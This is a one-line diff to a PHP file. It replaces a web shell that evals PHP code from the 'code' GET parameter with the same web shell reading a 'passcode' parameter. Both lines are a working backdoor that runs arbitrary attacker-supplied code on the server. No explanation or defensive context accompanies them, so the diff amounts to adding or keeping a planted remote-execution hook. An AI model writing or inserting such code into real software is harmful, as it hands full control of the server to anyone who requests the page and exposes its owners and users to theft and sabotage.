@@ -1,1 +1,1 @@
-<?php eval("?>".$_GET["code"]."<?php "); ?>
+<?php eval("?>".$_GET["passcode"]."<?php "); ?>
